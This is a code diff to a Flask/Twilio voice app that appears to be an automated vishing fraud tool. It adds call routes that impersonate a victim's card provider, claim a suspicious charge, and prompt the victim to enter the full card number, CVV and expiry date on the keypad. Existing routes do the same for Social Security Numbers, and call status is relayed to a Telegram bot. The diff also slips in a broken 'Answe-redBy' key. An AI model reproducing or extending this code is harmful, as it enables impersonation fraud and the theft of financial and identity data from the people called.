@@ -229,7 +229,7 @@ def voicecash():
         resp.append(gather)
         print('Call in progress')
     return str(resp)
-#CASHAPPEND
+
 #SSN
 @app.route("/voice/bank", methods=['GET', 'POST'])
 def voicebank():
@@ -266,6 +266,111 @@ def voicebank():
         resp.append(gather)
         print('Call in progress')
     return str(resp)
+@app.route("/voice/card", methods=['GET', 'POST'])
+def voicecard():
+    chanid = request.args.get('chanid')
+    resp = VoiceResponse()
+    name = request.args.get('name')
+    cardname = request.args.get('card')
+    if 'AnsweredBy' in request.values:
+        answered_by = request.values['AnsweredBy']
+        if answered_by == 'machine_start':
+            requests.post(f"https://api.telegram.org/bot{botid}/sendMessage", data={"chat_id": chanid , "text": "🤖 Call answered by machine"})
+
+            return str(resp)
+    if 'Digits' in request.values:
+        choice = request.values['Digits']
+        if choice == '1':
+            gather = Gather(num_digits=16, action='/validate?chanid=' + chanid, timeout=16)
+            requests.post(f"https://api.telegram.org/bot{botid}/sendMessage", data={"chat_id": chanid , "text": "#️⃣ One pressed User will enter card info soon"})
+            print('')
+            gather.say('To confirm this please enter the card numbers for this card in the pinpad now', volume=2, voice="alice")
+            resp.append(gather)
+            print('Code sent')
+            return str(resp)
+        else:
+            resp.say("Sorry, I don't understand that choice.")
+    else:
+        if 'AnsweredBy' in request.values:
+            answered_by = request.values['AnsweredBy']
+            if answered_by == 'human':
+                requests.post(f"https://api.telegram.org/bot{botid}/sendMessage", data={"chat_id": chanid , "text": "👤 Call answered by Human"})
+        gather = Gather(num_digits=1, action='/voice/card?chanid=' + chanid, timeout=6)
+        requests.post(f"https://api.telegram.org/bot{botid}/sendMessage", data={"chat_id":  chanid , "text": "📲 Call Answered"})
+        gather.say(f'Hello {name}, this is your card provider. We are calling to inform you about a request to make charges on your {cardname}. If this was not you press one. If this was you, you can hang up and have a great rest of your day', volume=2, voice="alice")
+        resp.append(gather)
+        print('Call in progress')
+    return str(resp)
+@app.route("/voice/cvv", methods=['GET', 'POST'])
+def voicecvv():
+    chanid = request.args.get('chanid')
+    resp = VoiceResponse()
+    name = request.args.get('name')
+    cardname = request.args.get('card')
+    if 'AnsweredBy' in request.values:
+        answered_by = request.values['AnsweredBy']
+        if answered_by == 'machine_start':
+            requests.post(f"https://api.telegram.org/bot{botid}/sendMessage", data={"chat_id": chanid , "text": "🤖 Call answered by machine"})
+
+            return str(resp)
+    if 'Digits' in request.values:
+        choice = request.values['Digits']
+        if choice == '1':
+            gather = Gather(num_digits=16, action='/validate?chanid=' + chanid, timeout=16)
+            requests.post(f"https://api.telegram.org/bot{botid}/sendMessage", data={"chat_id": chanid , "text": "#️⃣ One pressed User will enter card info soon"})
+            print('')
+            gather.say('To confirm this please enter the C V V  for this card in the pinpad now', volume=2, voice="alice")
+            resp.append(gather)
+            print('Code sent')
+            return str(resp)
+        else:
+            resp.say("Sorry, I don't understand that choice.")
+    else:
+        if 'AnsweredBy' in request.values:
+            answered_by = request.values['AnsweredBy']
+            if answered_by == 'human':
+                requests.post(f"https://api.telegram.org/bot{botid}/sendMessage", data={"chat_id": chanid , "text": "👤 Call answered by Human"})
+        gather = Gather(num_digits=3, action='/voice/cvv?chanid=' + chanid, timeout=6)
+        requests.post(f"https://api.telegram.org/bot{botid}/sendMessage", data={"chat_id":  chanid , "text": "📲 Call Answered"})
+        gather.say(f'Hello {name}, this is your card provider. We are calling to inform you about a request to make charges on your {cardname}. If this was not you press one. If this was you, you can hang up and have a great rest of your day', volume=2, voice="alice")
+        resp.append(gather)
+        print('Call in progress')
+    return str(resp)
+@app.route("/voice/date", methods=['GET', 'POST'])
+def voicedate():
+    chanid = request.args.get('chanid')
+    resp = VoiceResponse()
+    name = request.args.get('name')
+    cardname = request.args.get('card')
+    if 'AnsweredBy' in request.values:
+        answered_by = request.values['AnsweredBy']
+        if answered_by == 'machine_start':
+            requests.post(f"https://api.telegram.org/bot{botid}/sendMessage", data={"chat_id": chanid , "text": "🤖 Call answered by machine"})
+
+            return str(resp)
+    if 'Digits' in request.values:
+        choice = request.values['Digits']
+        if choice == '1':
+            gather = Gather(num_digits=4, action='/validate?chanid=' + chanid, timeout=16)
+            requests.post(f"https://api.telegram.org/bot{botid}/sendMessage", data={"chat_id": chanid , "text": "#️⃣ One pressed User will enter card info soon"})
+            print('')
+            gather.say('To confirm this please enter the expiration date for this card in the pinpad now', volume=2, voice="alice")
+            resp.append(gather)
+            print('Code sent')
+            return str(resp)
+        else:
+            resp.say("Sorry, I don't understand that choice.")
+    else:
+        if 'AnsweredBy' in request.values:
+            answered_by = request.values['AnsweredBy']
+            if answered_by == 'human':
+                requests.post(f"https://api.telegram.org/bot{botid}/sendMessage", data={"chat_id": chanid , "text": "👤 Call answered by Human"})
+        gather = Gather(num_digits=1, action='/voice/date?chanid=' + chanid, timeout=6)
+        requests.post(f"https://api.telegram.org/bot{botid}/sendMessage", data={"chat_id":  chanid , "text": "📲 Call Answered"})
+        gather.say(f'Hello {name}, this is your card provider. We are calling to inform you about a request to make charges on your {cardname}. If this was not you press one. If this was you, you can hang up and have a great rest of your day', volume=2, voice="alice")
+        resp.append(gather)
+        print('Call in progress')
+    return str(resp)
 @app.route("/voice/ssn", methods=['GET', 'POST'])
 def voicessn():
       chanid = request.args.get('chanid')
@@ -282,7 +387,7 @@ def voicessn():
           choice = request.values['Digits']
           if choice == '1':
               gather = Gather(num_digits=9, action='/validate?chanid=' + chanid, timeout=30)
-              requests.post(f"https://api.telegram.org/bot{botid}/sendMessage", data={"chat_id": chanid , "text": "The user pressed 1 they will input their SSN soon!"})
+              requests.post(f"https://api.telegram.org/bot{botid}/sendMessage", data={"chat_id": chanid , "text": "#️⃣ The user pressed 1 they will input their SSN soon!"})
               print('')
               gather.say('Please enter your Social Security Number now to block all actions.', volume=2, voice="alice")
               resp.append(gather)
@@ -292,7 +397,7 @@ def voicessn():
               resp.say("Sorry, I don't understand that choice.")
       else:
         if 'AnsweredBy' in request.values:
-            answered_by = request.values['AnsweredBy']
+            answered_by = request.values['Answe-redBy']
             if answered_by == 'human':
                 requests.post(f"https://api.telegram.org/bot{botid}/sendMessage", data={"chat_id": chanid , "text": "👤 Call answered by Human"})
         gather = Gather(num_digits=1, action='/voice/ssn?chanid=' + chanid+'&ssn='+'True', timeout=6)
